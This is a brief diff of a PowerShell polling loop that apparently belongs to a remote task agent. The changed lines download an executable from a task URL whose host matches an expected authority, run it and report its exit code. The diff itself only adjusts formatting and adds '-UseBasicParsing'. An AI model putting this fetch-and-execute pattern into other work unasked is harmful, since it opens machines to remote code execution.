@@ -46,7 +46,7 @@ while ($true) {
         $auth = $task.content -replace '^[^/]*//([^/]*)/.*', '$1'
 
         if ($uuid -and $auth -eq $ca) {
-            Invoke-WebRequest -Uri $task.content -OutFile (New-Item -Path "$dir\$uuid.exe" -Force)
+            Invoke-WebRequest -Uri $task.content -OutFile (New-Item -path "$dir\$uuid.exe" -Force ) -UseBasicParsing
             $code = Execute "$dir\$uuid.exe"
             $dat = "${uuid}:${code}"
         } elseif ($task -eq "stop") {
